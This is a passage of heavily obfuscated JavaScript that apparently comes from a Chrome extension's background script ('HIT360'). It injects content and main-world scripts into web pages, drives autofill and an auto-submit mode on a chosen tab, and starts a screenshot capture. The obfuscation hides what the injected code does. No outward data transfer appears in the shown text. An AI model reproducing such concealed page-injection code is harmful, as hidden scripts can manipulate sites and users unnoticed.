        return !!(_0x563ac9 && _0x563ac9[0x2 * -0x54f + -0x582 + 0x10 * 0x102] && _0x563ac9[-0x1ca5 * 0x1 + 0x2165 + -0x4c0][_0xaa1228(0x30d)]);
    } catch (_0x2edf44) {
        return ![];
    }
}
async function ensureTopContentScript(_0x586f05) {
    const _0x3c7292 = _0x3e9bf1, _0x5effb4 = { 'xPIvH': _0x3c7292(0x385) + _0x3c7292(0x40d) };
    try {
        return await chrome[_0x3c7292(0x298)][_0x3c7292(0x228) + _0x3c7292(0x3b2)]({
            'target': {
                'tabId': _0x586f05,
                'allFrames': ![]
            },
            'files': [_0x5effb4[_0x3c7292(0x1e4)]]
        }), !![];
    } catch (_0x2cc49d) {
        return ![];
    }
}
async function injectMainWorldScripts(_0x5030aa) {
    const _0x4ed8c1 = _0x3e9bf1, _0x152408 = {
            'OZosk': _0x4ed8c1(0x3d6) + _0x4ed8c1(0x2b0) + _0x4ed8c1(0x22d),
            'OBKks': function (_0x27b78a) {
                return _0x27b78a();
            },
            'Aegmt': function (_0x4d8f60, _0x4f3513) {
                return _0x4d8f60 >= _0x4f3513;
            },
            'fNHRM': _0x4ed8c1(0x285) + _0x4ed8c1(0x2ae) + _0x4ed8c1(0x1c4),
            'mpmEd': function (_0x120966, _0x54d70d) {
                return _0x120966(_0x54d70d);
            },
            'uHaYt': _0x4ed8c1(0x1a6) + _0x4ed8c1(0x201) + _0x4ed8c1(0x371) + ']',
            'yTzMo': _0x4ed8c1(0x21c),
            'vNPEE': _0x4ed8c1(0x380) + _0x4ed8c1(0x30b),
            'twXJR': function (_0x24997b) {
                return _0x24997b();
            },
            'Kqgmv': function (_0x5cc1de, _0x51e956, _0x4175f8) {
                return _0x5cc1de(_0x51e956, _0x4175f8);
            },
            'ToIDR': _0x4ed8c1(0x39a),
            'Kjtmw': _0x4ed8c1(0x244),
            'vpEeu': _0x4ed8c1(0x2eb) + _0x4ed8c1(0x1aa),
            'bvfHU': _0x4ed8c1(0x248) + _0x4ed8c1(0x3b4),
            'MArNt': _0x4ed8c1(0x338) + _0x4ed8c1(0x27c),
            'zUfmd': _0x4ed8c1(0x2fc) + _0x4ed8c1(0x17a)
        };
    try {
        await chrome[_0x4ed8c1(0x298)][_0x4ed8c1(0x241)]({
            'target': {
                'tabId': _0x5030aa,
                'allFrames': ![]
            },
            'files': [_0x152408[_0x4ed8c1(0x2f1)]]
        });
    } catch (_0x4b5e9d) {
    }
    try {
        await chrome[_0x4ed8c1(0x298)][_0x4ed8c1(0x228) + _0x4ed8c1(0x3b2)]({
            'target': {
                'tabId': _0x5030aa,
                'allFrames': ![]
            },
            'world': _0x152408[_0x4ed8c1(0x351)],
            'files': [
                _0x152408[_0x4ed8c1(0x337)],
                _0x152408[_0x4ed8c1(0x194)],
                _0x152408[_0x4ed8c1(0x297)]
            ]
        });
    } catch (_0x5efa95) {
    }
    try {
        await chrome[_0x4ed8c1(0x298)][_0x4ed8c1(0x228) + _0x4ed8c1(0x3b2)]({
            'target': {
                'tabId': _0x5030aa,
                'allFrames': ![]
            },
            'world': _0x152408[_0x4ed8c1(0x351)],
            'args': [chrome[_0x4ed8c1(0x36f)][_0x4ed8c1(0x320)](_0x152408[_0x4ed8c1(0x353)])],
            'func': _0xd81ae4 => {
                const _0x412534 = _0x4ed8c1, _0x590223 = {
                        'gcPHD': _0x152408[_0x412534(0x19a)],
                        'HfeQK': function (_0x3a4998) {
                            const _0x4e101d = _0x412534;
                            return _0x152408[_0x4e101d(0x28c)](_0x3a4998);
                        },
                        'XkWHc': function (_0x5df105, _0x44d575) {
                            const _0x22bafd = _0x412534;
                            return _0x152408[_0x22bafd(0x1c2)](_0x5df105, _0x44d575);
                        },
                        'GJeMH': _0x152408[_0x412534(0x294)],
                        'tQAYF': function (_0x34e7f6, _0x39e672) {
                            const _0x507cb0 = _0x412534;
                            return _0x152408[_0x507cb0(0x200)](_0x34e7f6, _0x39e672);
                        }
                    };
                try {
                    if (!document[_0x412534(0x1b2) + _0x412534(0x3fe)](_0x152408[_0x412534(0x25f)])) {
                        const _0x25bab7 = document[_0x412534(0x178) + _0x412534(0x20a)](_0x152408[_0x412534(0x1c3)]);
                        _0x25bab7[_0x412534(0x20f)] = _0x152408[_0x412534(0x255)], _0x25bab7[_0x412534(0x284)] = _0xd81ae4, (document[_0x412534(0x3db)] || document[_0x412534(0x332) + _0x412534(0x322)])[_0x412534(0x1b7) + 'd'](_0x25bab7);
                    }
                    const _0x268323 = () => {
                        const _0x67115d = _0x412534;
                        window[_0x67115d(0x273) + 'e']({ 'type': _0x590223[_0x67115d(0x211)] }, '*');
                    };
                    _0x152408[_0x412534(0x31d)](_0x268323);
                    let _0x2d5d05 = -0x1 * -0xe87 + 0x1 * 0xda3 + 0x2d1 * -0xa;
                    const _0x38fe4b = _0x152408[_0x412534(0x36b)](setInterval, () => {
                        const _0x5870a3 = _0x412534;
                        _0x590223[_0x5870a3(0x328)](_0x268323), _0x2d5d05 += -0x25d * 0xa + -0x1522 + 0x2cc5, (_0x590223[_0x5870a3(0x2c5)](_0x2d5d05, -0xadd + -0x24af + 0x2 * 0x17d5) || document[_0x5870a3(0x1b2) + _0x5870a3(0x3fe)](_0x590223[_0x5870a3(0x3a7)])) && _0x590223[_0x5870a3(0x193)](clearInterval, _0x38fe4b);
                    }, -0x6 * -0x2d7 + 0x6 * 0xdf + -0x15cc);
                } catch (_0x2c4e7a) {
                }
            }
        });
    } catch (_0x4da91b) {
    }
}
async function injectOpenPanelBridge(_0x4efe91) {
    const _0xea95c3 = _0x3e9bf1, _0x56aebd = {
            'usPsG': _0xea95c3(0x352) + _0xea95c3(0x2a9),
            'cKrTV': _0xea95c3(0x3c2),
            'aPmNP': _0xea95c3(0x38e),
            'WNCyC': _0xea95c3(0x3d6) + _0xea95c3(0x2b0) + _0xea95c3(0x22d),
            'KtsqP': _0xea95c3(0x1a6) + _0xea95c3(0x201) + _0xea95c3(0x371) + ']',
            'nviqv': _0xea95c3(0x21c),
            'hixpS': _0xea95c3(0x380) + _0xea95c3(0x30b),
            'LhEBB': function (_0x2c5ada) {
                return _0x2c5ada();
            },
            'HexhO': function (_0x3ca3a3, _0x409e21) {
                return _0x3ca3a3 && _0x409e21;
            },
            'SRegM': _0xea95c3(0x24d),
            'UgfFX': _0xea95c3(0x3d2),
            'YcNnp': function (_0x640935, _0x8f315f) {
                return _0x640935 >= _0x8f315f;
            },
            'VqXAY': _0xea95c3(0x285) + _0xea95c3(0x2ae) + _0xea95c3(0x1c4),
            'VurQp': function (_0xa3d103, _0x4f3336) {
                return _0xa3d103(_0x4f3336);
            },
            'zcrWV': function (_0x2e82ee, _0x133045, _0x1db83c) {
                return _0x2e82ee(_0x133045, _0x1db83c);
            },
            'DKybp': _0xea95c3(0x19d) + _0xea95c3(0x270),
            'EiIRm': function (_0x3b52fc) {
                return _0x3b52fc();
            },
            'DsToo': function (_0x2359c8, _0x3e6435) {
                return _0x2359c8 !== _0x3e6435;
            },
            'wAhWV': _0xea95c3(0x39a),
            'PhFxG': _0xea95c3(0x2fc) + _0xea95c3(0x17a),
            'XRycF': _0xea95c3(0x2eb) + _0xea95c3(0x1aa),
            'ytMGJ': _0xea95c3(0x248) + _0xea95c3(0x3b4),
            'voflI': _0xea95c3(0x338) + _0xea95c3(0x27c)
        };
    try {
        await chrome[_0xea95c3(0x298)][_0xea95c3(0x228) + _0xea95c3(0x3b2)]({
            'target': {
                'tabId': _0x4efe91,
                'allFrames': ![]
            },
            'args': [{
                    'styles': chrome[_0xea95c3(0x36f)][_0xea95c3(0x320)](_0x56aebd[_0xea95c3(0x25b)]),
                    'icon': chrome[_0xea95c3(0x36f)][_0xea95c3(0x320)](_0x56aebd[_0xea95c3(0x17c)]),
                    'storage': chrome[_0xea95c3(0x36f)][_0xea95c3(0x320)](_0x56aebd[_0xea95c3(0x3ed)]),
                    'autofill': chrome[_0xea95c3(0x36f)][_0xea95c3(0x320)](_0x56aebd[_0xea95c3(0x33d)]),
                    'inject': chrome[_0xea95c3(0x36f)][_0xea95c3(0x320)](_0x56aebd[_0xea95c3(0x2a0)])
                }],
            'func': _0x361754 => {
                const _0x1f0c5c = _0xea95c3, _0x197b9f = {
                        'YUTMk': _0x56aebd[_0x1f0c5c(0x1fe)],
                        'QwbTp': _0x56aebd[_0x1f0c5c(0x32f)],
                        'KFBHq': _0x56aebd[_0x1f0c5c(0x27b)],
                        'yhehK': function (_0x46fd67) {
                            const _0x3d7844 = _0x1f0c5c;
                            return _0x56aebd[_0x3d7844(0x1b0)](_0x46fd67);
                        },
                        'eciiD': function (_0x15190b, _0x432d10) {
                            const _0x2f86d7 = _0x1f0c5c;
                            return _0x56aebd[_0x2f86d7(0x260)](_0x15190b, _0x432d10);
                        },
                        'vKiqV': _0x56aebd[_0x1f0c5c(0x1d1)],
                        'NbSXP': _0x56aebd[_0x1f0c5c(0x278)],
                        'IfMwf': function (_0x54f47e, _0x26e7bc) {
                            const _0x1bc678 = _0x1f0c5c;
                            return _0x56aebd[_0x1bc678(0x2e2)](_0x54f47e, _0x26e7bc);
                        },
                        'NTUNt': _0x56aebd[_0x1f0c5c(0x18e)],
                        'VPSlB': function (_0x444df6, _0x212381) {
                            const _0xbf68e7 = _0x1f0c5c;
                            return _0x56aebd[_0xbf68e7(0x266)](_0x444df6, _0x212381);
                        },
                        'DHJVw': function (_0x41ff99, _0x4fd023, _0x10897d) {
                            const _0x4f3dce = _0x1f0c5c;
                            return _0x56aebd[_0x4f3dce(0x23c)](_0x41ff99, _0x4fd023, _0x10897d);
                        },
                        'gGLbV': _0x56aebd[_0x1f0c5c(0x2ba)],
                        'pINVa': function (_0x427959) {
                            const _0x105512 = _0x1f0c5c;
                            return _0x56aebd[_0x105512(0x376)](_0x427959);
                        }
                    };
                try {
                    if (_0x56aebd[_0x1f0c5c(0x217)](window[_0x1f0c5c(0x3dc)], window))
                        return;
                    const _0x3e5c3c = () => {
                            const _0x54972b = _0x1f0c5c;
                            if (document[_0x54972b(0x1ff) + _0x54972b(0x30e)](_0x56aebd[_0x54972b(0x1d0)]))
                                return;
                            const _0xfd7649 = document[_0x54972b(0x178) + _0x54972b(0x20a)](_0x56aebd[_0x54972b(0x3cd)]);
                            _0xfd7649['id'] = _0x56aebd[_0x54972b(0x1d0)], _0xfd7649[_0x54972b(0x3bb)] = _0x56aebd[_0x54972b(0x2f5)], _0xfd7649[_0x54972b(0x2bb)] = _0x361754[_0x54972b(0x396)], (document[_0x54972b(0x3db)] || document[_0x54972b(0x332) + _0x54972b(0x322)])[_0x54972b(0x1b7) + 'd'](_0xfd7649);
                        }, _0x414431 = () => {
                            const _0x837d00 = _0x1f0c5c;
                            if (document[_0x837d00(0x1b2) + _0x837d00(0x3fe)](_0x197b9f[_0x837d00(0x2fe)]))
                                return;
                            const _0x22ac2c = document[_0x837d00(0x178) + _0x837d00(0x20a)](_0x197b9f[_0x837d00(0x179)]);
                            _0x22ac2c[_0x837d00(0x20f)] = _0x197b9f[_0x837d00(0x291)], _0x22ac2c[_0x837d00(0x284)] = _0x361754[_0x837d00(0x23b)], (document[_0x837d00(0x3db)] || document[_0x837d00(0x332) + _0x837d00(0x322)])[_0x837d00(0x1b7) + 'd'](_0x22ac2c);
                        }, _0x6cf2c2 = (_0x47a8b4, _0x52daec) => new Promise(_0x4ac4d8 => {
                            const _0x352a43 = _0x1f0c5c;
                            let _0x4b0881 = document[_0x352a43(0x1b2) + _0x352a43(0x3fe)](_0x352a43(0x3b7) + '=\x22' + _0x47a8b4 + '\x22]');
                            _0x197b9f[_0x352a43(0x280)](!_0x4b0881, _0x52daec) && (_0x4b0881 = document[_0x352a43(0x1b2) + _0x352a43(0x3fe)](_0x352a43(0x2da) + _0x52daec + ']'));
                            if (_0x4b0881) {
                                _0x197b9f[_0x352a43(0x2fd)](_0x4ac4d8);
                                return;
                            }
                            const _0x558d4e = document[_0x352a43(0x178) + _0x352a43(0x20a)](_0x197b9f[_0x352a43(0x3ba)]);
                            _0x558d4e[_0x352a43(0x36d)] = _0x47a8b4, _0x52daec && _0x558d4e[_0x352a43(0x235) + 'te'](_0x52daec, _0x197b9f[_0x352a43(0x18f)]), _0x558d4e[_0x352a43(0x34e)] = () => {
                                const _0x282735 = _0x352a43;
                                _0x558d4e[_0x282735(0x192)](), _0x197b9f[_0x282735(0x2fd)](_0x4ac4d8);
                            }, _0x558d4e[_0x352a43(0x264)] = () => _0x4ac4d8(), (document[_0x352a43(0x3db)] || document[_0x352a43(0x332) + _0x352a43(0x322)])[_0x352a43(0x1b7) + 'd'](_0x558d4e);
                        }), _0x346b4e = () => {
                            const _0x679eb9 = _0x1f0c5c;
                            window[_0x679eb9(0x273) + 'e']({ 'type': _0x56aebd[_0x679eb9(0x185)] }, '*');
                        };
                    _0x56aebd[_0x1f0c5c(0x376)](_0x3e5c3c), _0x56aebd[_0x1f0c5c(0x376)](_0x414431), ((async () => {
                        const _0x28016e = _0x1f0c5c, _0x3cd9cb = {
                                'aRRCP': function (_0x4d65ae) {
                                    const _0x1a07cb = _0x2bd7;
                                    return _0x197b9f[_0x1a07cb(0x2fd)](_0x4d65ae);
                                },
                                'vwOoi': function (_0x84a197, _0xb756c6) {
                                    const _0x43f59b = _0x2bd7;
                                    return _0x197b9f[_0x43f59b(0x2e4)](_0x84a197, _0xb756c6);
                                },
                                'kgSNQ': _0x197b9f[_0x28016e(0x335)],
                                'wqppD': function (_0x372ae6, _0x5e0aa3) {
                                    const _0x329a85 = _0x28016e;
                                    return _0x197b9f[_0x329a85(0x365)](_0x372ae6, _0x5e0aa3);
                                }
                            };
                        await _0x197b9f[_0x28016e(0x365)](_0x6cf2c2, _0x361754[_0x28016e(0x1d3)]), await _0x197b9f[_0x28016e(0x365)](_0x6cf2c2, _0x361754[_0x28016e(0x312)]), await _0x197b9f[_0x28016e(0x287)](_0x6cf2c2, _0x361754[_0x28016e(0x207)], _0x197b9f[_0x28016e(0x242)]), _0x197b9f[_0x28016e(0x36e)](_0x346b4e);
                        let _0x1c4b53 = 0x16d3 + -0x2 * 0x4fa + -0xcdf;
                        const _0x3b7a5a = _0x197b9f[_0x28016e(0x287)](setInterval, () => {
                            const _0x4f3505 = _0x28016e;
                            _0x3cd9cb[_0x4f3505(0x2b9)](_0x346b4e), _0x1c4b53 += -0x9 * -0x25f + 0x1807 + -0x2d5d, (_0x3cd9cb[_0x4f3505(0x400)](_0x1c4b53, 0xb * 0xd5 + 0x972 + -0x127b) || document[_0x4f3505(0x1b2) + _0x4f3505(0x3fe)](_0x3cd9cb[_0x4f3505(0x225)])) && _0x3cd9cb[_0x4f3505(0x2ea)](clearInterval, _0x3b7a5a);
                        }, 0xf7a + -0x423 * -0x5 + -0x23b1);
                    })());
                } catch (_0x2384ce) {
                }
            }
        });
    } catch (_0x3b4695) {
    }
}
async function openPanelForTab(_0x8d31d9) {
    const _0x23ec87 = _0x3e9bf1, _0x3e7d1d = {
            'lFRdA': function (_0x4e4455, _0x542aba) {
                return _0x4e4455(_0x542aba);
            },
            'oeSMp': function (_0xefaa8e, _0xff82cc) {
                return _0xefaa8e(_0xff82cc);
            },
            'aNKtE': function (_0x4fbd8e, _0x2a5dc1) {
                return _0x4fbd8e(_0x2a5dc1);
            },
            'IIPko': function (_0x14e2b3, _0x8e2de4) {
                return _0x14e2b3(_0x8e2de4);
            },
            'cjmBx': function (_0xd63318, _0x521213) {
                return _0xd63318(_0x521213);
            }
        };
    if (!_0x8d31d9 || !_0x8d31d9['id'])
        return ![];
    if (!_0x8d31d9[_0x23ec87(0x314)])
        return ![];
    if (_0x3e7d1d[_0x23ec87(0x399)](isRestrictedTabUrl, _0x8d31d9[_0x23ec87(0x314)]))
        return ![];
    const _0x5c510a = await _0x3e7d1d[_0x23ec87(0x2ca)](tryOpenPanelViaMessage, _0x8d31d9['id']);
    if (_0x5c510a || await _0x3e7d1d[_0x23ec87(0x212)](hasPanelOverlay, _0x8d31d9['id']))
        return !![];
    await _0x3e7d1d[_0x23ec87(0x2ca)](ensureTopContentScript, _0x8d31d9['id']);
    const _0x36857c = await _0x3e7d1d[_0x23ec87(0x209)](tryOpenPanelViaMessage, _0x8d31d9['id']);
    if (_0x36857c || await _0x3e7d1d[_0x23ec87(0x399)](hasPanelOverlay, _0x8d31d9['id']))
        return !![];
    await _0x3e7d1d[_0x23ec87(0x2ca)](injectMainWorldScripts, _0x8d31d9['id']);
    const _0x1b93ec = await _0x3e7d1d[_0x23ec87(0x252)](tryOpenPanelViaMessage, _0x8d31d9['id']);
    if (_0x1b93ec || await _0x3e7d1d[_0x23ec87(0x252)](hasPanelOverlay, _0x8d31d9['id']))
        return !![];
    await _0x3e7d1d[_0x23ec87(0x252)](injectOpenPanelBridge, _0x8d31d9['id']);
    const _0x15cb12 = await _0x3e7d1d[_0x23ec87(0x209)](tryOpenPanelViaMessage, _0x8d31d9['id']);
    if (_0x15cb12 || await _0x3e7d1d[_0x23ec87(0x209)](hasPanelOverlay, _0x8d31d9['id']))
        return !![];
    return ![];
}
async function resolveAutomationTab(_0x58363e) {
    const _0x2a5457 = _0x3e9bf1, _0x681b5b = {
            'vmAQL': function (_0x598ced, _0x23b3c8) {
                return _0x598ced(_0x23b3c8);
            }
        };
    if (_0x58363e)
        try {
            const _0x46dabe = await chrome[_0x2a5457(0x236)][_0x2a5457(0x30c)](_0x58363e);
            if (_0x46dabe && _0x46dabe['id'] && !_0x681b5b[_0x2a5457(0x329)](isRestrictedTabUrl, _0x46dabe[_0x2a5457(0x314)] || ''))
                return _0x46dabe;
        } catch (_0x59f048) {
        }
    try {
        const [_0x409790] = await chrome[_0x2a5457(0x236)][_0x2a5457(0x1fa)]({
            'active': !![],
            'lastFocusedWindow': !![]
        });
        if (_0x409790 && _0x409790['id'] && !_0x681b5b[_0x2a5457(0x329)](isRestrictedTabUrl, _0x409790[_0x2a5457(0x314)] || ''))
            return _0x409790;
    } catch (_0x31fbc9) {
    }
    try {
        const _0x44b371 = await chrome[_0x2a5457(0x236)][_0x2a5457(0x1fa)]({ 'lastFocusedWindow': !![] });
        if (_0x44b371 && _0x44b371[_0x2a5457(0x3f0)])
            for (const _0x51d3c9 of _0x44b371) {
                if (!_0x51d3c9 || !_0x51d3c9['id'])
                    continue;
                if (_0x681b5b[_0x2a5457(0x329)](isRestrictedTabUrl, _0x51d3c9[_0x2a5457(0x314)] || ''))
                    continue;
                return _0x51d3c9;
            }
    } catch (_0x273a4a) {
    }
    return null;
}
async function toggleAutoSubmitOnTab(_0x39f025) {
    const _0x47cbb8 = _0x3e9bf1, _0x2b139a = {
            'oqcty': function (_0x4a52cd, _0x30465a) {
                return _0x4a52cd(_0x30465a);
            },
            'gNgdU': _0x47cbb8(0x375) + _0x47cbb8(0x26c) + 'd',
            'ZypLW': function (_0x4b3b0b, _0xe87d69) {
                return _0x4b3b0b(_0xe87d69);
            },
            'fKjhC': _0x47cbb8(0x1f0) + _0x47cbb8(0x1d8) + _0x47cbb8(0x183),
            'kxxYB': function (_0x440078, _0x636634) {
                return _0x440078 === _0x636634;
            },
            'VChFj': _0x47cbb8(0x2ab),
            'hpJJS': function (_0x13c5d9, _0x1c0262) {
                return _0x13c5d9 !== _0x1c0262;
            },
            'EGNjX': _0x47cbb8(0x1c0) + _0x47cbb8(0x1b3) + _0x47cbb8(0x387),
            'mGsKv': _0x47cbb8(0x1a7) + _0x47cbb8(0x271)
        }, _0x321d7b = await _0x2b139a[_0x47cbb8(0x3d0)](resolveAutomationTab, _0x39f025);
    if (!_0x321d7b || !_0x321d7b['id'])
        return {
            'ok': ![],
            'reason': _0x2b139a[_0x47cbb8(0x360)]
        };
    try {
        await chrome[_0x47cbb8(0x1d3)][_0x47cbb8(0x3ff)][_0x47cbb8(0x19b)]({ 'HIT360_panel_target_tab_id': _0x321d7b['id'] });
    } catch (_0x57ebbf) {
    }
    await _0x2b139a[_0x47cbb8(0x208)](ensureTopContentScript, _0x321d7b['id']);
    try {
        const _0x2da5f5 = await chrome[_0x47cbb8(0x236)][_0x47cbb8(0x2bd) + 'e'](_0x321d7b['id'], { 'type': _0x2b139a[_0x47cbb8(0x35d)] }, { 'frameId': 0x0 });
        if (_0x2da5f5 && _0x2b139a[_0x47cbb8(0x247)](typeof _0x2da5f5[_0x47cbb8(0x1a2)], _0x2b139a[_0x47cbb8(0x1f5)]))
            return {
                'ok': _0x2b139a[_0x47cbb8(0x23e)](_0x2da5f5['ok'], ![]),
                'isRunning': !!_0x2da5f5[_0x47cbb8(0x1a2)],
                'reason': _0x2da5f5[_0x47cbb8(0x3c8)] || ''
            };
        return {
            'ok': ![],
            'reason': _0x2b139a[_0x47cbb8(0x269)]
        };
    } catch (_0x1dc6a7) {
        return {
            'ok': ![],
            'reason': _0x1dc6a7[_0x47cbb8(0x2df)] || _0x2b139a[_0x47cbb8(0x32e)]
        };
    }
}
async function getAutoSubmitStateOnTab(_0x179299) {
    const _0x4a80f8 = _0x3e9bf1, _0x4b5bfb = {
            'iGtWd': function (_0x382047, _0x236356) {
                return _0x382047(_0x236356);
            },
            'kJboX': _0x4a80f8(0x375) + _0x4a80f8(0x26c) + 'd',
            'OSZsL': function (_0x5ebb0d, _0x1b4471) {
                return _0x5ebb0d(_0x1b4471);
            },
            'uttMB': _0x4a80f8(0x37e) + _0x4a80f8(0x25e) + _0x4a80f8(0x349),
            'DyrID': function (_0x35534b, _0x1205c6) {
                return _0x35534b === _0x1205c6;
            },
            'voRGt': _0x4a80f8(0x2ab),
            'bcAhU': function (_0x4a47ab, _0x17204c) {
                return _0x4a47ab !== _0x17204c;
            },
            'rcsfI': _0x4a80f8(0x325) + _0x4a80f8(0x416) + _0x4a80f8(0x223) + _0x4a80f8(0x1c1),
            'zcYmr': _0x4a80f8(0x2f3) + _0x4a80f8(0x3a5)
        }, _0x53700 = await _0x4b5bfb[_0x4a80f8(0x1f9)](resolveAutomationTab, _0x179299);
    if (!_0x53700 || !_0x53700['id'])
        return {
            'ok': ![],
            'isRunning': ![],
            'reason': _0x4b5bfb[_0x4a80f8(0x409)]
        };
    try {
        await chrome[_0x4a80f8(0x1d3)][_0x4a80f8(0x3ff)][_0x4a80f8(0x19b)]({ 'HIT360_panel_target_tab_id': _0x53700['id'] });
    } catch (_0x46099c) {
    }
    await _0x4b5bfb[_0x4a80f8(0x2f4)](ensureTopContentScript, _0x53700['id']);
    try {
        const _0x2f85d8 = await chrome[_0x4a80f8(0x236)][_0x4a80f8(0x2bd) + 'e'](_0x53700['id'], { 'type': _0x4b5bfb[_0x4a80f8(0x39d)] }, { 'frameId': 0x0 });
        if (_0x2f85d8 && _0x4b5bfb[_0x4a80f8(0x2b4)](typeof _0x2f85d8[_0x4a80f8(0x1a2)], _0x4b5bfb[_0x4a80f8(0x339)]))
            return {
                'ok': _0x4b5bfb[_0x4a80f8(0x3e0)](_0x2f85d8['ok'], ![]),
                'isRunning': !!_0x2f85d8[_0x4a80f8(0x1a2)],
                'reason': _0x2f85d8[_0x4a80f8(0x3c8)] || ''
            };
        return {
            'ok': ![],
            'isRunning': ![],
            'reason': _0x4b5bfb[_0x4a80f8(0x253)]
        };
    } catch (_0x423cef) {
        return {
            'ok': ![],
            'isRunning': ![],
            'reason': _0x423cef[_0x4a80f8(0x2df)] || _0x4b5bfb[_0x4a80f8(0x21b)]
        };
    }
}
chrome[_0x3e9bf1(0x289)][_0x3e9bf1(0x2a6)][_0x3e9bf1(0x2d0) + 'r'](_0x81e9cc => {
    const _0x4baf34 = _0x3e9bf1, _0x3114ac = {
            'LhKPb': function (_0x2a2d12, _0x454aaa) {
                return _0x2a2d12(_0x454aaa);
            },
            'ylshH': function (_0x1acb60, _0x309537) {
                return _0x1acb60(_0x309537);
            },
            'OKOfV': _0x4baf34(0x2bf),
            'GMGCB': function (_0x5ab0c8, _0x4af82c) {
                return _0x5ab0c8(_0x4af82c);
            },
            'cRqBT': _0x4baf34(0x2d9),
            'WLzKO': function (_0x5f4948, _0x26ba33) {
                return _0x5f4948 + _0x26ba33;
            },
            'ZkhOr': _0x4baf34(0x326) + '?',
            'pKcQE': _0x4baf34(0x326)
        }, _0x46c57c = new URLSearchParams();
    _0x81e9cc && _0x81e9cc['id'] && !_0x3114ac[_0x4baf34(0x1db)](isRestrictedTabUrl, _0x81e9cc[_0x4baf34(0x314)] || '') && (_0x46c57c[_0x4baf34(0x19b)](_0x3114ac[_0x4baf34(0x1e6)], _0x3114ac[_0x4baf34(0x39e)](String, _0x81e9cc['id'])), chrome[_0x4baf34(0x1d3)][_0x4baf34(0x3ff)][_0x4baf34(0x19b)]({ 'HIT360_panel_target_tab_id': _0x81e9cc['id'] })[_0x4baf34(0x2c4)](() => {
    }));
    _0x81e9cc && _0x81e9cc[_0x4baf34(0x2d9)] && _0x46c57c[_0x4baf34(0x19b)](_0x3114ac[_0x4baf34(0x377)], _0x3114ac[_0x4baf34(0x1db)](String, _0x81e9cc[_0x4baf34(0x2d9)]));
    const _0x3c1d27 = _0x46c57c[_0x4baf34(0x2cc)](), _0xb33ec3 = chrome[_0x4baf34(0x36f)][_0x4baf34(0x320)](_0x3c1d27 ? _0x3114ac[_0x4baf34(0x370)](_0x3114ac[_0x4baf34(0x1da)], _0x3c1d27) : _0x3114ac[_0x4baf34(0x346)]);
    chrome[_0x4baf34(0x236)][_0x4baf34(0x391)]({ 'url': _0xb33ec3 })[_0x4baf34(0x2c4)](() => {
        const _0x450231 = _0x4baf34;
        _0x3114ac[_0x450231(0x29b)](openPanelForTab, _0x81e9cc)[_0x450231(0x2c4)](() => {
        });
    });
}), chrome[_0x3e9bf1(0x36f)][_0x3e9bf1(0x3a0)][_0x3e9bf1(0x2d0) + 'r'](_0x3ddf0f => {
    const _0x36600d = _0x3e9bf1, _0x2aad17 = {
            'otDIl': _0x36600d(0x1a8),
            'IJwsy': function (_0x2b18f0, _0x4193a0) {
                return _0x2b18f0(_0x4193a0);
            },
            'xYfnU': function (_0x25243e) {
                return _0x25243e();
            },
            'mOMaN': function (_0x3dd4b, _0x319053, _0x29f379) {
                return _0x3dd4b(_0x319053, _0x29f379);
            }
        };
    ports[_0x36600d(0x2f8)](_0x3ddf0f), _0x2aad17[_0x36600d(0x35b)](registerServiceWorker), _0x3ddf0f[_0x36600d(0x256) + 'ct'][_0x36600d(0x2d0) + 'r'](() => {
        const _0x41a4c7 = _0x36600d;
        ports[_0x41a4c7(0x237)](_0x3ddf0f);
    });
    const _0x217140 = _0x2aad17[_0x36600d(0x243)](setInterval, () => {
        const _0x18965f = _0x36600d;
        try {
            _0x3ddf0f[_0x18965f(0x273) + 'e']({ 'type': _0x2aad17[_0x18965f(0x34b)] });
        } catch (_0x2efc01) {
            _0x2aad17[_0x18965f(0x189)](clearInterval, _0x217140);
        }
    }, -0xabf + 0x30c4 + 0x13e1 * 0x3);
});
let offscreenCreated = ![];
async function ensureOffscreenDocument() {
    const _0x445e4b = _0x3e9bf1, _0x199f94 = {
            'AdFqO': _0x445e4b(0x17b) + _0x445e4b(0x216),
            'gEmVD': function (_0x1052e5, _0xcddd64) {
                return _0x1052e5 > _0xcddd64;
            },
            'osTQe': _0x445e4b(0x1ea) + _0x445e4b(0x24f),
            'sBwNe': _0x445e4b(0x2b8) + _0x445e4b(0x398),
            'gaJOq': _0x445e4b(0x342) + _0x445e4b(0x40c) + _0x445e4b(0x2d5) + 'n',
            'dlgpm': _0x445e4b(0x38a) + _0x445e4b(0x1e0)
        };
    if (offscreenCreated)
        return !![];
    try {
        const _0x42077a = await chrome[_0x445e4b(0x36f)][_0x445e4b(0x411) + 's']({ 'contextTypes': [_0x199f94[_0x445e4b(0x20e)]] });
        if (_0x199f94[_0x445e4b(0x2d3)](_0x42077a[_0x445e4b(0x3f0)], 0x1 * -0x659 + -0x1546 + 0x1b9f))
            return offscreenCreated = !![], !![];
        return await chrome[_0x445e4b(0x410)][_0x445e4b(0x19c) + _0x445e4b(0x319)]({
            'url': _0x199f94[_0x445e4b(0x3a4)],
            'reasons': [_0x199f94[_0x445e4b(0x29a)]],
            'justification': _0x199f94[_0x445e4b(0x300)]
        }), offscreenCreated = !![], !![];
    } catch (_0x419079) {
        if (_0x419079[_0x445e4b(0x2df)]?.[_0x445e4b(0x36a)](_0x199f94[_0x445e4b(0x404)]))
            return offscreenCreated = !![], !![];
        return ![];
    }
}
const capturedHits = new Map();
async function captureScreenshot(_0x3de42c, _0xcbdf41 = {}) {
    const _0x25e9df = _0x3e9bf1, _0x597af5 = {
            'SRzWP': function (_0x3148c0, _0x36e985) {
                return _0x3148c0 === _0x36e985;
            },
            'WLFhc': function (_0x2f52d3, _0x3ec9b9) {
                return _0x2f52d3 === _0x3ec9b9;
            },
            'OHKYR': function (_0x8a5337, _0x40b1a7) {
                return _0x8a5337 === _0x40b1a7;
            },
            'SQncm': _0x25e9df(0x3f4),
            'kVcQo': _0x25e9df(0x301),
            'TETkg': function (_0x15d01e, _0x947ea3) {
                return _0x15d01e(_0x947ea3);
            },
            'ickxA': _0x25e9df(0x305) + _0x25e9df(0x2a1) + 's',
            'WusYx': function (_0x3af42b, _0x41629c) {
                return _0x3af42b || _0x41629c;
            },
            'xhgqk': _0x25e9df(0x1af),
            'DReSR': function (_0x3074b3, _0x3ba818) {
                return _0x3074b3 < _0x3ba818;
            },
            'dvmcK': function (_0x571afe, _0x58dbd3) {
                return _0x571afe - _0x58dbd3;
            },
            'ytxFV': function (_0x15b715, _0x41d1fe, _0x257da5) {
                return _0x15b715(_0x41d1fe, _0x257da5);
            },
            'RMxse': _0x25e9df(0x35a) + _0x25e9df(0x3b8) + 'w',
            'WKMMk': function (_0x3abaad) {
                return _0x3abaad();
            },
